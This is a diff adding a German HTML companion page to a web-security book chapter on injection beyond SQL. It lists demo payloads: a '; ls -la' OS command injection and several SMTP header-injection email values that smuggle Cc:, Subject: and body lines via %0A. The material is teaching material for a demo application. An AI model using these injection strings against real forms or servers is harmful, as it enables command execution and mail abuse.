@@ -1,0 +1,95 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+
+<title>You&#8217;ve been hacked! - Kapitel 7</title>
+
+</head>
+
+<body>
+
+<h1>Kapitel 7 - Injection jenseits von SQL</h1>
+
+<h2>7.9 - Die Demo-Anwendung</h2>
+
+<h3>7.9.1 - OS Command Injection</h3>
+
+<p>
+Exploits f&uuml;r ein Verzeichnislisting:<br>
+<code>; ls -la</code>
+</p>
+
+<h3>7.9.2 - SMTP-Injection</h3> 
+
+<h4>SMTP-Injection im Kontaktformular</h4>
+
+<p>
+Exploit:
+</p>
+
+<ul>
+    <li> <code>Cc:</code>-Zeile einschleusen:<br>
+      E-Mail-Adresse ist <br>
+      <code>mail@server1.example%0ACc:mail@server2.example,mail@server3.example</code>
+</ul>
+
+<h4>SMTP-Injection in der Empfehlungsfunktion</h4>
+
+<p>
+Exploits:
+</p>
+
+<ul>
+    <li> Zus&auml;tzliche <code>Subject:</code>-Zeile:<br>
+      Empf&auml;nger oder Absender ist  <br>
+      <code>info@tester.example%0aSubject:%20Das%20neue%20Subject</code>
+    <li> Zwei zus&auml;tzliche <code>Subject:</code>-Zeilen:<br>
+      Empf&auml;nger ist <br>
+      <code>empfaenger@tester.example%0aSubject:%20Das%20neue%20Subject%20vom%20Empfaenger</code><br>
+      <b>UND</b> <br>
+      Absender ist <br>
+      <code>absender@tester.example%0aSubject:%20Das%20neue%20Subject%20vom%20Absender</code>
+    <li> Zus&auml;tzliche <code>Subject:</code>-Zeile und neuer Body:<br>
+      Empf&auml;nger oder Absender ist  <br>
+      <code>tester@tester.example%0aSubject:%20Das%20neue%20Subject%0a%0aDer%20neue%20Text!</code>
+</ul>
+
+<h4>SMTP-Injection trotz Pr&uuml;fungen im Kontaktformular</h4>
+
+
+<p>
+Exploits zum Einf&uuml;gen einer zus&auml;tzlichen <code>Cc:</code>-Zeile:
+</p>
+
+<ul>
+    <li> Angriff von oben:<br>
+      E-Mail-Adresse ist <br>
+      <code>mail@server1.example%0ACc:mail@server2.example,mail@server3.example</code><br>
+      Das funktioniert nicht, weil der Browser die Eingabe nicht als E-Mail-Adresse
+      akzeptiert.
+    <li> Alternative: <br>
+      Gleiche &Auml;nderung im Proxy vornehmen
+    <li> Weitere Alternative:<br>
+      Wert in Subject eingeben
+</ul>
+
+
+<h2>Die Links</h2>
+
+<ul>
+    <li> [OWASP_NoSQL-TG] <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection">OWASP Testing Guide v4: Testing for NoSQL injection</a>
+    <li> [RFC_821] <a href="https://tools.ietf.org/html/rfc821">RFC 821 -  Simple Mail Transfer Protocol</a>
+    <li> [RFC_2821] <a href="https://tools.ietf.org/html/rfc2821">RFC 2821 -  Simple Mail Transfer Protocol</a>
+    <li> [RFC_5321] <a href="https://tools.ietf.org/html/rfc5321">RFC 5321 -  Simple Mail Transfer Protocol</a>
+    <li> [Tayl_10] <a href="https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/">Phil Taylor; Web Application Security Blog: &#8222;Mongodb is vulnerable to SQL injection in PHP at least&#8220;</a>
+</ul>
+
+<hr>
+
+<p>
+<a href="../hacking-index.html">Zur&uuml;ck</a>
+</p>
+
+</body>
+
+</html>
